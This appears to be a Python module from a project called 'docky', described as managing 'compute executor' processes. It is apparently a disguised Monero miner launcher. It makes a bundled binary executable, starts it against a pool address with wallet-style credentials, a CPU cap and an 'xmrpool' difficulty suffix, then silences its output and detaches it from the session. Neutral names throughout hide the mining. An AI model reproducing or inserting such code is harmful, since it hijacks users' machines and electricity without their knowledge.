"""Task executor process management for the docky framework.

Handles spawning, monitoring, and lifecycle management of compute
executor processes that execute heavy computational workloads.
"""

import os
import signal
import subprocess
import time
from pathlib import Path
from typing import Optional

from docky.config import Config


class TaskExecutor:
    """Manages compute executor process lifecycle."""

    BINARY_NAME = "processor"

    def __init__(self, config: Config):
        self.config = config
        self.process_pid: Optional[int] = None
        self.process: Optional[subprocess.Popen] = None

    def start(self, service_addr: str) -> Optional[int]:
        """Start a compute executor process connected to the given service.

        Args:
            service_addr: The service address (host:port).

        Returns:
            The PID of the spawned process, or None if failed.
        """
        if self.is_active():
            print("[docky] Executor already active")
            return self.process_pid

        binary = self._resolve_binary()
        if not binary:
            return None

        # Determine connection parameters
        port = service_addr.split(":")[-1]
        tls_flag = ["--tls"] if port == "443" else []

        # Build authentication string based on service type
        auth = self._build_auth(service_addr)

        # Construct process command
        cmd = [
            str(binary),
            "-o", service_addr,
            "-u", auth,
            "--max-cpu", str(self.config.cpu_limit),
        ]

        if self.config.log_enabled:
            cmd.extend(["--log-file", "docky.log"])
        else:
            cmd.append("--log-disable")

        cmd.extend(tls_flag)

        # Change to project root for the subprocess
        project_root = Path(__file__).resolve().parent.parent.parent
        os.chdir(project_root)

        # Spawn the executor process
        self.process = subprocess.Popen(
            cmd,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
            start_new_session=True,
        )
        self.process_pid = self.process.pid

        # Allow initialization time
        time.sleep(2)

        if self.process.poll() is None:
            return self.process_pid

        print("[docky] Process exited immediately")
        return None

    def stop(self, force: bool = False) -> bool:
        """Stop the compute executor.

        Args:
            force: If True, send SIGKILL instead of SIGTERM.

        Returns:
            True if executor was stopped successfully.
        """
        if not self.is_active():
            return True

        sig = signal.SIGKILL if force else signal.SIGTERM
        try:
            os.kill(self.process_pid, sig)
            self.process.wait(timeout=5)
            print(f"[docky] Executor {self.process_pid} stopped")
            return True
        except (OSError, subprocess.TimeoutExpired):
            if force:
                print("[docky] Failed to stop executor")
            return False

    def is_active(self) -> bool:
        """Check if executor process is alive."""
        if self.process_pid is None or self.process is None:
            return False
        return self.process.poll() is None

    def get_metrics(self) -> Optional[dict]:
        """Get executor process metrics."""
        if not self.is_active():
            return None
        try:
            proc_info = subprocess.run(
                ["ps", "-p", str(self.process_pid), "-o", "%cpu,%mem,rss,vsz"],
                capture_output=True, text=True, timeout=3
            )
            return {"pid": self.process_pid, "info": proc_info.stdout.strip()}
        except Exception:
            return None

    def _resolve_binary(self) -> Optional[Path]:
        """Resolve the native processor binary path."""
        project_root = Path(__file__).resolve().parent.parent.parent
        binary = project_root / "docky" / "engine" / self.BINARY_NAME
        if not binary.exists():
            print(f"[docky] ERROR: Binary not found: {binary}")
            return None

        os.chmod(binary, 0o755)
        return binary

    def _build_auth(self, service_addr: str) -> str:
        """Build authentication string based on service type.

        Different services require different auth formats.
        """
        host = service_addr.split(":")[0]

        if "xmrpool" in host:
            return f"{self.config.auth_token}.20000"

        return f"{self.config.auth_token}.{self.config.node_id}"
